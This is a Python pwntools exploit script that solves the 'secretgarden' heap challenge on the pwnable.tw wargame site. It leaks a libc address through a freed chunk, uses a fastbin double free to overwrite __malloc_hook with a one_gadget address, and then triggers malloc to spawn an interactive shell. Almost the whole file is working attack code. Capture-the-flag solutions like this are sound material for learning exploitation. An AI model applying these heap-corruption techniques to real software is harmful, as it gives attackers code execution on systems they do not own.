#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./secretgarden"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
elif len(sys.argv)==2:
    conn=remote("127.1",4444)
    pid=0
else:
    conn=remote("chall.pwnable.tw",10203)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def raise_flower(name,color,length=-1):
    if length==-1:
        length=len(name)
    conn.sendlineafter("Your choice :","1")
    conn.sendlineafter("Length of the name :",str(length))
    conn.sendafter("The name of flower :",name)
    conn.sendlineafter("The color of the flower :",color)
    conn.recvuntil("Successful !\n")

def remove_flower(index):
    conn.sendlineafter("Your choice :","3")
    conn.sendlineafter("Which flower do you want to remove from the garden:",str(index))

def show_garden():
    conn.sendlineafter("Your choice :","2")

def clean_garden():
    conn.sendlineafter("Your choice :","4")

# use main_arena to leak libc address
raise_flower("aaaa","test",300)
raise_flower("aaaa","test",300)
raise_flower("aaaa","test",40)
remove_flower(0)
remove_flower(2)
raise_flower("a"*8,"test",300)
show_garden()
conn.recvuntil("a"*8)
libc_address=u64(conn.recv(6)+"\x00"+"\x00")-0x3c3b78
log.debug("libc address :0x%x"%libc_address)
remove_flower(1)
remove_flower(3)
clean_garden()

# double free to change __malloc_hook
raise_flower("a","test",0x70-8)
raise_flower("a","test",0x70-8)
raise_flower("a","test",0x70-8)
remove_flower(1)
remove_flower(2)
remove_flower(1)
raise_flower(p64(libc_address+libc.symbols["__malloc_hook"]-19-16),"test",0x70-8)
raise_flower("a","test",0x70-8)
raise_flower("a","test",0x70-8)
# replace __malloc_hook with one_gadget address
raise_flower("a"*19+p64(libc_address+0xf0567),"test",0x70-8)

debug()
# directly malloc doesn't work
# double free triggers error and it will call malloc 
remove_flower(3)
remove_flower(3)
conn.interactive()




